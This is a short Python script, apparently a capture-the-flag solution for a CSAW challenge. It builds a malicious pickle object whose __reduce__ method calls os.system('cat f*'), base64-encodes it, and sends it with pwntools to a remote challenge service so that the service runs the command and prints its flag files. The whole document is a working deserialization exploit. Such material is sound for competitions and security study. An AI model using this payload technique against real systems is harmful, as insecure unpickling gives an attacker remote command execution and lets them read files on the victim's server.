from pwn import *
import pickle
import os
import base64

class exploit(object):
    def __reduce__(self):
        return os.system,('cat f*',)

kimji = pickle.dumps(exploit())
payload = 'RMbPOQHCzt.loads(HrjYMvtxwA(%s))' % base64.b64encode(kimji)
print(payload)

r = remote('pwn.chal.csaw.io', 5011)
r.recvline()
r.sendline(payload)
print(r.recvline())
r.close()
